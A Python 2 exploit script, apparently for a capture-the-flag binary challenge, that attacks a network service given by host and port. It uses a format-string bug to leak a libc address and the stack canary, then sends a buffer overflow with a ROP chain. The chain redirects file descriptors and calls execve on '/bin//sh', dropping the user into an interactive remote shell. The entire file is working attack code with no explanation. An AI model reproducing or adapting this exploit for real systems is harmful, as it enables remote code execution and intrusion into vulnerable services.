import sys, socket, telnetlib
from struct import *
import random
import time
import binascii
import time
def recvuntil(t):
    p = ''
    while not p.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        p += tmp

    return p

def interactive():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]

def recvMenu():
    recvuntil("Your choice > ")
    return

def leakAddrAtStack(offset,bytesToRead):
    print "LEAKING ADDR at stack offset " + str(offset)
    s.send("2\n")
    recvuntil("Your format > ")
    s.send("%" + str(offset) + "$lx\n")
    address = s.recv(bytesToRead)
    recvuntil("Your format > ")
    s.send("\n")
    return(int("0x" + address,16))

def doBufferOverflow(payload):
    print "PWNING"
    s.send("1\n")
    recvuntil("How much bytes you want to send ? ")
    s.send(str(len(payload)) + "\n")
    s.send(payload)
    print "INTERACTIVE"
    interactive()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))

recvMenu()
libcstartmain_Address = leakAddrAtStack(158,12) - 0x20830   #offset 0x20830 from init
print hex(libcstartmain_Address)
recvMenu()
canary = leakAddrAtStack(144,16)
print hex(canary)
p = ''

p += p64(0x0000000000021102+ libcstartmain_Address)                                                 # pop rdi; ret
p += p64(0x4)
p += p64(0x00000000000202e8+ libcstartmain_Address)                                                 # pop rsi; ret
p += p64(0x0)
p += p64(0x00000000000F6D90+ libcstartmain_Address)

p += p64(0x0000000000021102+ libcstartmain_Address)                                                 # pop rdi; ret
p += p64(0x4)
p += p64(0x00000000000202e8+ libcstartmain_Address)                                                 # pop rsi; ret
p += p64(0x1)
p += p64(0x00000000000F6D90+ libcstartmain_Address)

p += p64(0x0000000000021102+ libcstartmain_Address)                                                 # pop rdi; ret
p += p64(0x4)
p += p64(0x00000000000202e8 + libcstartmain_Address)                                                 # pop rsi; ret
p += p64(0x3)
p += p64(0x00000000000F6D90+ libcstartmain_Address)

p += pack('<Q', 0x0000000000001b92+ libcstartmain_Address) # pop rdx ; ret
p += pack('<Q', 0x00000000003c3080+ libcstartmain_Address) # @ .data
p += pack('<Q', 0x0000000000033544+ libcstartmain_Address) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000002e19c+ libcstartmain_Address) # mov qword ptr [rdx], rax ; ret
p += pack('<Q', 0x0000000000001b92+ libcstartmain_Address) # pop rdx ; ret
p += pack('<Q', 0x00000000003c3088+ libcstartmain_Address) # @ .data + 8
p += pack('<Q', 0x000000000008ad15+ libcstartmain_Address) # xor rax, rax ; ret
p += pack('<Q', 0x000000000002e19c+ libcstartmain_Address) # mov qword ptr [rdx], rax ; ret
p += pack('<Q', 0x0000000000021102+ libcstartmain_Address) # pop rdi ; ret
p += pack('<Q', 0x00000000003c3080+ libcstartmain_Address) # @ .data
p += pack('<Q', 0x00000000000202e8+ libcstartmain_Address) # pop rsi ; ret
p += pack('<Q', 0x00000000003c3088+ libcstartmain_Address) # @ .data + 8
p += pack('<Q', 0x0000000000001b92+ libcstartmain_Address) # pop rdx ; ret
p += pack('<Q', 0x00000000003c3088+ libcstartmain_Address) # @ .data + 8
p += pack('<Q', 0x000000000008ad15+ libcstartmain_Address) # xor rax, rax ; ret
p += pack('<Q', 0x00000000000ab390+ libcstartmain_Address)*59 # add rax, 1 ; ret
p += pack('<Q', 0x00000000000bb7c5+ libcstartmain_Address) # syscall ; ret
doBufferOverflow("A"*(1032) + p64(canary)+ p64(0xdeadbeef) + p + "\n")

# doBufferOverflow("A"*1031)
